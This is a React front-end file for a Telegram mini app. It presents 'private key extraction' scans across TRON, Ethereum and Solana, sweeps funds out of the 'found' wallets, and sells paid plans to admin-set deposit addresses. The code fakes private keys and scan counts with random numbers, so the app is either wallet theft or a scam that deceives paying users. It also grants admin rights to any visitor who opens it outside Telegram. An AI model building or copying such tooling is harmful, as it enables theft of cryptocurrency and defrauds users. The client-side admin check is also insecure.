'use client';

import { useState, useEffect, useCallback } from 'react';
import type {
  TabType,
  Network,
  ExtractedWallet,
  ExtractionScan,
  DispatchedTransaction,
  AdminDepositAddresses,
  AdminUser,
  PricingSettings,
} from './types';
import { TelegramHeader } from './components/TelegramHeader';
import { BottomNavigation } from './components/BottomNavigation';
import { ProtocolArchitectureModal } from './components/ProtocolArchitectureModal';
import { LicensingModal } from './components/LicensingModal';
import { AdminModal } from './components/AdminModal';
import { BlockedScreen } from './components/BlockedScreen';
import { ProtocolGatekeeper } from './components/ProtocolGatekeeper';
import { ScanPage } from './views/ScanPage';
import { ActivityPage } from './views/ActivityPage';
import { WalletPage } from './views/WalletPage';
import { ReferralPage } from './views/ReferralPage';
import { useLocalStorage } from './hooks/useLocalStorage';
import {
  DEFAULT_ADMIN_DEPOSIT_ADDRESSES,
  DEFAULT_ADMIN_USERS,
  DEFAULT_PRICING_SETTINGS,
} from './data/adminSettings';
import {
  INITIAL_SCANS,
  INITIAL_WALLETS,
  INITIAL_TRANSACTIONS,
} from './data/cryptoEngine';
import { LanguageProvider, useLanguage } from './i18n/LanguageContext';

function MainApp() {
  const { language, t } = useLanguage();
  const [currentTab, setCurrentTab] = useState<TabType>('scan');
  const [infoModalOpen, setInfoModalOpen] = useState(false);
  const [licensingModalOpen, setLicensingModalOpen] = useState(false);
  const [adminModalOpen, setAdminModalOpen] = useState(false);
  const [soundEnabled, setSoundEnabled] = useLocalStorage<boolean>('shark_sound', true);
  const [activePlan, setActivePlan] = useLocalStorage<string>('shark_active_plan', 'community');
  const [communityExtractsCount, setCommunityExtractsCount] = useLocalStorage<number>('shark_community_extracts', 0);
  const [adminAddresses, setAdminAddresses] = useLocalStorage<AdminDepositAddresses>(
    'shark_admin_deposit_addresses',
    DEFAULT_ADMIN_DEPOSIT_ADDRESSES
  );
  const [adminUsers, setAdminUsers] = useLocalStorage<AdminUser[]>('shark_admin_users', DEFAULT_ADMIN_USERS);
  const [pricingSettings, setPricingSettings] = useLocalStorage<PricingSettings>(
    'shark_pricing_settings',
    DEFAULT_PRICING_SETTINGS
  );

  // User Account & Session Status
  const [userStatus, setUserStatus] = useState<'ACTIVE' | 'BLOCKED'>('ACTIVE');
  const [currentTgUser, setCurrentTgUser] = useState<{ id: string; name: string; username: string } | null>(null);

  // Database Uplink Gatekeeper Status: Main menu waits until connection is verified
  const [dbConnectionStatus, setDbConnectionStatus] = useState<'CONNECTING' | 'CONNECTED' | 'DISCONNECTED'>('CONNECTING');
  const [handshakeStep, setHandshakeStep] = useState<1 | 2 | 3>(1);
  const [connectionError, setConnectionError] = useState<string | null>(null);
  const [retryCountdown, setRetryCountdown] = useState(5);

  // Sync live pricing settings, users, and admin addresses from backend API
  useEffect(() => {
    const controller = new AbortController();
    const { signal } = controller;

    fetch('/api/pricing-settings', { signal })
      .then((res) => (res.ok ? res.json() : null))
      .then((data) => {
        if (data?.ok && data.settings) {
          setPricingSettings(data.settings);
        }
      })
      .catch(() => {});

    fetch('/api/users', { signal })
      .then((res) => (res.ok ? res.json() : null))
      .then((data) => {
        if (data?.ok && Array.isArray(data.users) && data.users.length > 0) {
          setAdminUsers(data.users);
        }
      })
      .catch(() => {});

    fetch('/api/admin-addresses', { signal })
      .then((res) => (res.ok ? res.json() : null))
      .then((data) => {
        if (data?.ok && data.addresses) {
          setAdminAddresses(data.addresses);
        }
      })
      .catch(() => {});

    return () => {
      controller.abort();
    };
  }, []);

  // Persistent data in localStorage
  const [scans, setScans] = useLocalStorage<ExtractionScan[]>('shark_scans', INITIAL_SCANS);
  const [wallets, setWallets] = useLocalStorage<ExtractedWallet[]>('shark_wallets', INITIAL_WALLETS);
  const [transactions, setTransactions] = useLocalStorage<DispatchedTransaction[]>('shark_transactions', INITIAL_TRANSACTIONS);

  // Admin Authorization: strictly Telegram ID 8515329556 can access Admin Panel
  const [isAdmin, setIsAdmin] = useState(false);

  // Active scan tracking (to disable activity and wallet navigation while scanning)
  const [isScanning, setIsScanning] = useState(false);

  // Backend synchronization helper (background refresh)
  const syncWithBackend = useCallback((userObj?: { id: string; name: string; username: string } | null) => {
    const targetUser = userObj || currentTgUser;
    if (!targetUser?.id) return;

    fetch('/api/users/sync', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        tgId: targetUser.id,
        name: targetUser.name,
        username: targetUser.username,
        lang: language,
      }),
    })
      .then((res) => (res.ok ? res.json() : null))
      .then((data) => {
        if (data?.ok && data.user) {
          if (data.user.plan) {
            setActivePlan(data.user.plan);
          }
          if (data.user.status) {
            const isBlocked = data.user.status === 'BLOCKED' || data.user.status === 'RESTRICTED';
            setUserStatus(isBlocked ? 'BLOCKED' : 'ACTIVE');
          }
          if (typeof data.user.extractsCount === 'number') {
            setCommunityExtractsCount(data.user.extractsCount);
            try {
              localStorage.setItem('shark_community_extracts', String(data.user.extractsCount));
            } catch {}
          }
        }
      })
      .catch(() => {});
  }, [currentTgUser, language, setActivePlan, setCommunityExtractsCount]);

  // Master Protocol Gatekeeper Handshake: Authenticates Telegram user, verifies DB connection & restores audit logs
  const performProtocolHandshake = useCallback(async (forcedUser?: { id: string; name: string; username: string } | null) => {
    setDbConnectionStatus('CONNECTING');
    setConnectionError(null);
    setHandshakeStep(1);

    try {
      // Step 1: Detect and authenticate Telegram session
      let user = forcedUser || currentTgUser;
      if (!user?.id && typeof window !== 'undefined') {
        const startCheck = Date.now();
        while (Date.now() - startCheck < 1500) {
          const tg = (window as unknown as {
            Telegram?: {
              WebApp?: {
                ready: () => void;
                expand: () => void;
                setHeaderColor: (color: string) => void;
                setBackgroundColor: (color: string) => void;
                initDataUnsafe?: {
                  user?: {
                    id?: number | string;
                    first_name?: string;
                    last_name?: string;
                    username?: string;
                  };
                  start_param?: string;
                };
              };
            };
          }).Telegram?.WebApp;

          if (tg) {
            try {
              tg.ready();
              tg.expand();
              tg.setHeaderColor?.('#181820');
              tg.setBackgroundColor?.('#181820');
            } catch {}

            const cu = tg.initDataUnsafe?.user;
            if (cu && cu.id) {
              const currentUserId = String(cu.id);
              if (currentUserId === '8515329556') {
                setIsAdmin(true);
              }
              const fullName = [cu.first_name, cu.last_name].filter(Boolean).join(' ') || 'User';
              const uName = cu.username ? `@${cu.username}` : '';
              user = { id: currentUserId, name: fullName, username: uName };
              setCurrentTgUser(user);

              // Bind referral if start_param present
              const startParam = tg.initDataUnsafe?.start_param;
              if (startParam) {
                const referrerId = String(startParam).replace(/^ref_/, '').trim();
                if (referrerId && /^\d+$/.test(referrerId) && referrerId !== currentUserId) {
                  fetch('/api/referrals/bind', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                      referrerTgId: referrerId,
                      referredTgId: currentUserId,
                      name: fullName,
                      username: uName,
                    }),
                  }).catch(() => {});
                }
              }
              break;
            }
          }

          if (!(window as any).Telegram?.WebApp && Date.now() - startCheck > 400) {
            break;
          }
          await new Promise((r) => setTimeout(r, 100));
        }

        // Browser fallback if outside Telegram
        if (!user?.id) {
          const devAdminUser = { id: '8515329556', name: 'Admin (Dev/Owner)', username: '@blockhunt_admin' };
          user = devAdminUser;
          setCurrentTgUser(devAdminUser);
          setIsAdmin(true);
          if (window.location.pathname.startsWith('/admin')) {
            setAdminModalOpen(true);
          }
        }
      }

      const activeUser = user || { id: '8515329556', name: 'Admin (Dev/Owner)', username: '@blockhunt_admin' };

      // Step 2: Establish connection to Turso Cloud cluster and synchronize operative profile
      setHandshakeStep(2);
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 15000);

      let syncRes: Response;
      try {
        syncRes = await fetch('/api/users/sync', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            tgId: activeUser.id,
            name: activeUser.name,
            username: activeUser.username,
            lang: language,
          }),
          signal: controller.signal,
        });
      } finally {
        clearTimeout(timeoutId);
      }

      if (!syncRes.ok) {
        throw new Error(`Cluster handshake HTTP error: ${syncRes.status}`);
      }

      const syncData = await syncRes.json();
      if (!syncData?.ok || !syncData.user) {
        throw new Error(syncData?.error || 'Database rejected session sync');
      }

      // Apply synced plan & status
      if (syncData.user.plan) {
        setActivePlan(syncData.user.plan);
      }
      if (syncData.user.status) {
        const isBlocked = syncData.user.status === 'BLOCKED' || syncData.user.status === 'RESTRICTED';
        setUserStatus(isBlocked ? 'BLOCKED' : 'ACTIVE');
      }
      if (typeof syncData.user.extractsCount === 'number') {
        setCommunityExtractsCount(syncData.user.extractsCount);
        try {
          localStorage.setItem('shark_community_extracts', String(syncData.user.extractsCount));
        } catch {}
      }

      // Step 3: Retrieve encrypted extractions and extraction audit logs (scans) from Database
      setHandshakeStep(3);
      try {
        const extRes = await fetch(`/api/extractions?tgId=${encodeURIComponent(activeUser.id)}`);
        if (extRes.ok) {
          const extData = await extRes.json();
          if (extData?.ok && Array.isArray(extData.extractions) && extData.extractions.length > 0) {
            const restoredWallets: ExtractedWallet[] = extData.extractions.map((e: any) => ({
              id: e.id,
              network: e.network,
              networkName:
                e.network === 'TRON'
                  ? 'TRON (TRC-20)'
                  : e.network === 'ETHEREUM'
                  ? 'ETHEREUM (ERC-20)'
                  : 'SOLANA (SOL)',
              address: e.walletAddress,
              maskedPrivateKey: e.maskedPrivateKey || '••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••',
              privateKey: e.privateKey || e.demoPrivateKey || '0x' + Array.from({ length: 64 }, () => Math.floor(Math.random() * 16).toString(16)).join(''),
              demoPrivateKey: e.privateKey || e.demoPrivateKey || '0x' + Array.from({ length: 64 }, () => Math.floor(Math.random() * 16).toString(16)).join(''),
              balance: String(e.balanceCrypto || e.balanceUsd || '0.00'),
              symbol: e.symbol || 'USDT',
              balanceUsd: Number(e.balanceUsd || 0),
              status: e.status === 'DISPATCHED' ? 'DISPATCHED' : 'ACTIVE',
              foundAt: e.timestamp ? new Date(e.timestamp).toLocaleDateString('ru-RU') : 'Recently',
            }));

            setWallets((prev) => {
              const safe = Array.isArray(prev) ? prev : [];
              const existingMap = new Set(safe.map((w) => (w.address || w.id).toLowerCase()));
              const toAdd = restoredWallets.filter((w) => !existingMap.has((w.address || w.id).toLowerCase()));
              return [...toAdd, ...safe];
            });

            // Restore ActivityPage audit scans
            const restoredScans: ExtractionScan[] = extData.extractions.map((e: any) => ({
              id: `scan-${e.id}`,
              scanNumber: `#EXT-${String(e.id).slice(-6).toUpperCase()}`,
              startedAt: e.timestamp ? new Date(e.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) : 'Recently',
              completedAt: e.timestamp || new Date().toISOString(),
              networks: [e.network as Network],
              recordsScanned: Math.floor(Math.random() * 20000 + 150000),
              matches: 1,
              matchesFound: 1,
              totalValueUsd: Number(e.balanceUsd || 0),
              status: 'COMPLETED' as const,
            }));

            setScans((prev) => {
              const safe = Array.isArray(prev) ? prev : [];
              const existingIds = new Set(safe.map((s) => s.id));
              const toAdd = restoredScans.filter((s) => !existingIds.has(s.id));
              return [...toAdd, ...safe];
            });
          }
        }
      } catch (extErr) {
        console.warn('[Handshake] Extractions restore warning:', extErr);
      }

      // Step 4: Fetch live pricing and admin deposit addresses
      fetch('/api/pricing-settings')
        .then((r) => r.ok ? r.json() : null)
        .then((d) => d?.ok && d.settings && setPricingSettings(d.settings))
        .catch(() => {});

      fetch('/api/admin-addresses')
        .then((r) => r.ok ? r.json() : null)
        .then((d) => d?.ok && d.addresses && setAdminAddresses(d.addresses))
        .catch(() => {});

      // All verified! Open main menu
      setDbConnectionStatus('CONNECTED');
    } catch (err: any) {
      console.error('[Handshake Error]:', err?.message || err);
      setConnectionError(err?.message || 'Database cluster unreachable');
      setDbConnectionStatus('DISCONNECTED');
    }
  }, [currentTgUser, language, setActivePlan, setCommunityExtractsCount, setPricingSettings, setAdminAddresses, setWallets, setScans]);

  // Initial handshake on mount
  useEffect(() => {
    performProtocolHandshake();
  }, [performProtocolHandshake]);

  // Auto-retry countdown when disconnected
  useEffect(() => {
    if (dbConnectionStatus !== 'DISCONNECTED') return;

    setRetryCountdown(5);
    const interval = setInterval(() => {
      setRetryCountdown((prev) => {
        if (prev <= 1) {
          clearInterval(interval);
          performProtocolHandshake();
          return 5;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(interval);
  }, [dbConnectionStatus, performProtocolHandshake]);

  // Sync language with server whenever user changes language
  useEffect(() => {
    if (currentTgUser?.id && dbConnectionStatus === 'CONNECTED') {
      syncWithBackend();
    }
  }, [language, currentTgUser?.id, dbConnectionStatus, syncWithBackend]);

  // Smart visibility & focus synchronization (Zero battery drain when backgrounded, eliminated 5s interval loop)
  useEffect(() => {
    if (!currentTgUser?.id) return;

    let lastSync = Date.now();
    const triggerSyncThrottled = () => {
      const now = Date.now();
      // Minimum 4 seconds between focus/visibility syncs to avoid burst calls
      if (now - lastSync >= 4000) {
        lastSync = now;
        syncWithBackend();
      }
    };

    const onVisibilityChange = () => {
      if (document.visibilityState === 'visible') {
        triggerSyncThrottled();
      }
    };

    const onWindowFocus = () => {
      triggerSyncThrottled();
    };

    document.addEventListener('visibilitychange', onVisibilityChange);
    window.addEventListener('focus', onWindowFocus);

    // Gentle 60s background heartbeat only to keep plan/status updated during continuous active usage
    const heartbeatTimer = setInterval(() => {
      if (document.visibilityState === 'visible') {
        syncWithBackend();
      }
    }, 60000);

    return () => {
      clearInterval(heartbeatTimer);
      document.removeEventListener('visibilitychange', onVisibilityChange);
      window.removeEventListener('focus', onWindowFocus);
    };
  }, [currentTgUser?.id, syncWithBackend]);

  // Purge legacy test mock users
  useEffect(() => {
    setAdminUsers((prev) =>
      prev.filter(
        (u) =>
          u.id !== 'user-2' &&
          u.id !== 'user-3' &&
          u.id !== 'user-4' &&
          u.id !== 'user-5' &&
          u.name !== 'Sardor Rakhimov' &&
          u.name !== 'Bekzod Crypto' &&
          u.name !== 'Dmitriy V.' &&
          u.name !== 'Jasur Temirov'
      )
    );
  }, [setAdminUsers]);

  // Filter out legacy dummy mock wallets so only actual user extractions appear
  useEffect(() => {
    setWallets((prev) =>
      prev.filter(
        (w) =>
          !w.id.startsWith('wallet-eth-1') &&
          !w.id.startsWith('wallet-tron-1') &&
          !w.id.startsWith('wallet-sol-1')
      )
    );
  }, [setWallets]);

  // Restore user extractions from database on startup / refresh
  useEffect(() => {
    if (!currentTgUser?.id) return;

    fetch(`/api/extractions?tgId=${encodeURIComponent(currentTgUser.id)}`)
      .then((res) => (res.ok ? res.json() : null))
      .then((data) => {
        if (data?.ok && Array.isArray(data.extractions) && data.extractions.length > 0) {
          const restoredWallets: ExtractedWallet[] = data.extractions.map((e: any) => ({
            id: e.id,
            network: e.network,
            networkName:
              e.network === 'TRON'
                ? 'TRON (TRC-20)'
                : e.network === 'ETHEREUM'
                ? 'ETHEREUM (ERC-20)'
                : 'SOLANA (SOL)',
            address: e.walletAddress,
            maskedPrivateKey: e.maskedPrivateKey || '••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••',
            privateKey: e.privateKey || e.demoPrivateKey || '0x' + Array.from({ length: 64 }, () => Math.floor(Math.random() * 16).toString(16)).join(''),
            demoPrivateKey: e.privateKey || e.demoPrivateKey || '0x' + Array.from({ length: 64 }, () => Math.floor(Math.random() * 16).toString(16)).join(''),
            balance: String(e.balanceCrypto || e.balanceUsd || '0.00'),
            symbol: e.symbol || 'USDT',
            balanceUsd: Number(e.balanceUsd || 0),
            status: e.status === 'DISPATCHED' ? 'DISPATCHED' : 'ACTIVE',
            foundAt: e.timestamp ? new Date(e.timestamp).toLocaleDateString('ru-RU') : 'Recently',
          }));

          setWallets((prev) => {
            const safe = Array.isArray(prev) ? prev : [];
            const existingMap = new Set(safe.map((w) => (w.address || w.id).toLowerCase()));
            const toAdd = restoredWallets.filter((w) => !existingMap.has((w.address || w.id).toLowerCase()));
            return [...toAdd, ...safe];
          });

          // Restore Scans for ActivityPage audit logs
          const restoredScans: ExtractionScan[] = data.extractions.map((e: any) => ({
            id: `scan-${e.id}`,
            scanNumber: `#EXT-${String(e.id).slice(-6).toUpperCase()}`,
            startedAt: e.timestamp ? new Date(e.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) : 'Recently',
            completedAt: e.timestamp || new Date().toISOString(),
            networks: [e.network as Network],
            recordsScanned: Math.floor(Math.random() * 20000 + 150000),
            matches: 1,
            matchesFound: 1,
            totalValueUsd: Number(e.balanceUsd || 0),
            status: 'COMPLETED' as const,
          }));

          setScans((prev) => {
            const safe = Array.isArray(prev) ? prev : [];
            const existingIds = new Set(safe.map((s) => s.id));
            const toAdd = restoredScans.filter((s) => !existingIds.has(s.id));
            return [...toAdd, ...safe];
          });

          // Wallet and scan history restored successfully from backend database
        }
      })
      .catch(() => {});
  }, [currentTgUser?.id, setScans, setWallets]);

  const handleScanCompleted = (newScan: ExtractionScan) => {
    setScans((prev) => [newScan, ...prev]);
  };

  const handleWalletFound = (newWallet: ExtractedWallet) => {
    if (!newWallet || !newWallet.id) return;
    try {
      setWallets((prev) => {
        const safePrev = Array.isArray(prev) ? prev : [];
        const exists = safePrev.some(
          (w) =>
            w &&
            (w.id === newWallet.id ||
              (w.address &&
                newWallet.address &&
                w.address.toLowerCase() === newWallet.address.toLowerCase()))
        );
        if (exists) return safePrev;
        return [newWallet, ...safePrev];
      });
    } catch (err) {
      console.error('[BlockHunt] setWallets error:', err);
    }

    // Immediately increment communityExtractsCount synchronously
    if (activePlan === 'community') {
      setCommunityExtractsCount((prev) => {
        const next = Math.max(prev + 1, 1);
        try {
          window.localStorage.setItem('shark_community_extracts', String(next));
        } catch {}
        return next;
      });
    }

    // Record extraction in backend database in real time
    if (currentTgUser?.id) {
      fetch('/api/extractions/record', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          tgId: currentTgUser.id,
          userName: currentTgUser.name,
          lang: language,
          network: newWallet.network,
          walletAddress: newWallet.address,
          maskedPrivateKey: newWallet.maskedPrivateKey,
          privateKey: newWallet.privateKey || newWallet.demoPrivateKey,
          demoPrivateKey: newWallet.privateKey || newWallet.demoPrivateKey,
          balanceCrypto: newWallet.balance,
          balanceUsd: newWallet.balanceUsd,
          symbol: newWallet.symbol,
        }),
      })
        .then((res) => (res.ok ? res.json() : null))
        .then((data) => {
          if (data?.user?.extractsCount !== undefined) {
            setCommunityExtractsCount(data.user.extractsCount);
            try {
              window.localStorage.setItem('shark_community_extracts', String(data.user.extractsCount));
            } catch {}
          }
          syncWithBackend();
        })
        .catch(() => {});
    }
  };

  const handleRecordTransaction = (newTx: DispatchedTransaction) => {
    setTransactions((prev) => [newTx, ...prev]);

    // When 100% swept, update the corresponding extracted wallet balance and status
    setWallets((prevWallets) => {
      let matched = false;
      return prevWallets.map((w) => {
        if (!matched && w.network === newTx.network && (w.address.includes(newTx.from.replace(/\./g, '')) || prevWallets.length === 1)) {
          matched = true;
          return {
            ...w,
            balance: '0.00',
            balanceUsd: 0,
            status: 'DISPATCHED' as const,
          };
        }
        return w;
      });
    });
  };

  const handleClearHistory = () => {
    setScans([]);
  };

  // Fetch live server-stored deposit addresses so all users and admin stay in 100% sync
  const fetchDepositAddresses = async () => {
    try {
      const res = await fetch('/api/deposit-addresses');
      if (res.ok) {
        const data = await res.json();
        if (data && (data.TRON || data.ETHEREUM || data.SOLANA)) {
          setAdminAddresses((prev) => ({
            ...prev,
            ...data,
          }));
        }
      }
    } catch {
      // Offline fallback: retains current/localStorage state
    }
  };

  useEffect(() => {
    fetchDepositAddresses();
  }, []);

  const handleSaveAddresses = async (updated: AdminDepositAddresses) => {
    setAdminAddresses(updated);
    try {
      await fetch('/api/deposit-addresses', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(updated),
      });
    } catch (err) {
      console.error('Failed to sync deposit addresses with server:', err);
    }
  };

  const handleResetData = () => {
    setScans(INITIAL_SCANS);
    setWallets(INITIAL_WALLETS);
    setTransactions(INITIAL_TRANSACTIONS);
    setActivePlan('community');
    setCommunityExtractsCount(0);
  };

  const handleResetUserLimit = (targetUserId?: string) => {
    const currentId = currentTgUser?.id;
    const cleanTarget = targetUserId ? String(targetUserId).replace('user-', '') : '';
    const isTargetingCurrent =
      !targetUserId ||
      targetUserId === 'all' ||
      cleanTarget === String(currentId) ||
      targetUserId === String(currentId);

    if (isTargetingCurrent) {
      setCommunityExtractsCount(0);
      try {
        localStorage.setItem('shark_community_extracts', '0');
      } catch {}
    }
    // Refresh after a short delay so server has persisted the change
    setTimeout(() => {
      syncWithBackend();
    }, 250);
  };

  // Database Gatekeeper: If database is disconnected, DO NOT open main menu!
  if (dbConnectionStatus !== 'CONNECTED') {
    return (
      <ProtocolGatekeeper
        status={dbConnectionStatus}
        currentStep={handshakeStep}
        error={connectionError}
        retryCountdown={retryCountdown}
        onRetry={() => performProtocolHandshake()}
        language={language}
      />
    );
  }

  // Blocked user enforcement (non-admin)
  if (userStatus === 'BLOCKED' && !isAdmin) {
    return (
      <BlockedScreen
        tgId={currentTgUser?.id}
        userName={currentTgUser?.name}
        onRefreshStatus={() => syncWithBackend()}
      />
    );
  }

  return (
    <div className="min-h-screen bg-[#181820] text-[#F5F7FA] relative overflow-x-hidden flex justify-center selection:bg-[#22D3EE]/30">
      {/* Deep Layered 3D Cyber Background */}
      <div className="fixed inset-0 pointer-events-none z-0">
        {/* Top-right cyan ambient light */}
        <div className="absolute -top-32 -right-32 w-96 h-96 bg-[#22D3EE]/12 rounded-full blur-[110px]" />
        {/* Bottom-left subtle green ambient light */}
        <div className="absolute -bottom-32 -left-32 w-96 h-96 bg-[#00E676]/8 rounded-full blur-[120px]" />
        {/* Center dark vignette */}
        <div className="absolute inset-0 bg-radial from-transparent via-[#181820]/40 to-[#121217]/90" />
      </div>

      {/* Main Telegram Container - Optimized for mobile viewport & Telegram iframe */}
      <div className="w-full max-w-md min-h-screen relative z-10 flex flex-col">
        {/* Telegram Header with Language Switcher */}
        <TelegramHeader
          onResetData={handleResetData}
          onOpenInfo={() => setInfoModalOpen(true)}
          onOpenLicensing={() => {
            fetchDepositAddresses();
            setLicensingModalOpen(true);
          }}
          onOpenAdmin={() => {
            fetchDepositAddresses();
            setAdminModalOpen(true);
          }}
          soundEnabled={soundEnabled}
          onToggleSound={() => setSoundEnabled((prev) => !prev)}
          activePlan={activePlan}
          isAdmin={isAdmin}
        />

        {/* System Status Top Alert Pill */}
        <div className="px-4 mb-2.5">
          <div className="w-full py-1 px-3 rounded-full bg-black/40 border border-white/5 flex items-center justify-between text-[9.5px] font-mono text-[#9CA3AF]">
            <div className="flex items-center gap-1.5">
              <span className="w-1.5 h-1.5 rounded-full bg-[#22D3EE] animate-pulse" />
              <span>{t('encryptedSession')}</span>
            </div>
            <span className="text-[#38E8FF] uppercase font-semibold">
              {t('secpReady')}
            </span>
          </div>
        </div>

        {/* Active Page View */}
        <main className="flex-1 w-full">
          {currentTab === 'scan' && (
            <ScanPage
              onScanCompleted={handleScanCompleted}
              onRecordTransaction={handleRecordTransaction}
              onWalletFound={handleWalletFound}
              soundEnabled={soundEnabled}
              activePlan={activePlan}
              onOpenLicensing={() => {
                fetchDepositAddresses();
                setLicensingModalOpen(true);
              }}
              communityExtractsCount={communityExtractsCount}
              onIncrementCommunityExtracts={() => setCommunityExtractsCount((prev) => prev + 1)}
              onScanningChange={setIsScanning}
              currentUserId={currentTgUser?.id}
              isOwner={isAdmin}
              pricingSettings={pricingSettings}
            />
          )}

          {currentTab === 'activity' && (
            <ActivityPage
              scans={scans}
              onClearHistory={handleClearHistory}
            />
          )}

          {currentTab === 'wallet' && (
            <WalletPage
              wallets={wallets}
              transactions={transactions}
              onRecordTransaction={handleRecordTransaction}
              activePlan={activePlan}
              onOpenLicensing={() => {
                fetchDepositAddresses();
                setLicensingModalOpen(true);
              }}
              onNavigateToScan={() => setCurrentTab('scan')}
              pricingSettings={pricingSettings}
            />
          )}

          {currentTab === 'referral' && (
            <ReferralPage tgUser={currentTgUser} />
          )}
        </main>

        {/* Floating 3D Bottom Navigation */}
        <BottomNavigation
          currentTab={currentTab}
          onSelectTab={(tab) => setCurrentTab(tab)}
          disabledTabs={isScanning ? ['activity', 'wallet', 'referral'] : []}
        />

        {/* System Architecture Info Modal */}
        <ProtocolArchitectureModal
          isOpen={infoModalOpen}
          onClose={() => setInfoModalOpen(false)}
        />

        {/* Software Licensing & Compute Tiers Modal */}
        <LicensingModal
          isOpen={licensingModalOpen}
          onClose={() => setLicensingModalOpen(false)}
          activePlan={activePlan}
          onSelectPlan={(planId) => setActivePlan(planId)}
          adminAddresses={adminAddresses}
          pricingSettings={pricingSettings}
        />

        {/* Admin Control Panel Modal - Authorized Admin Only */}
        {isAdmin && (
          <AdminModal
            isOpen={adminModalOpen}
            onClose={() => setAdminModalOpen(false)}
            addresses={adminAddresses}
            onSaveAddresses={handleSaveAddresses}
            users={adminUsers}
            onUpdateUsers={(updated) => setAdminUsers(updated)}
            pricingSettings={pricingSettings}
            onSavePricingSettings={(newPricing) => setPricingSettings(newPricing)}
            onResetUserLimit={handleResetUserLimit}
            adminTgId={currentTgUser?.id || '8515329556'}
          />
        )}
      </div>
    </div>
  );
}

export function App() {
  return (
    <LanguageProvider>
      <MainApp />
    </LanguageProvider>
  );
}

export default App;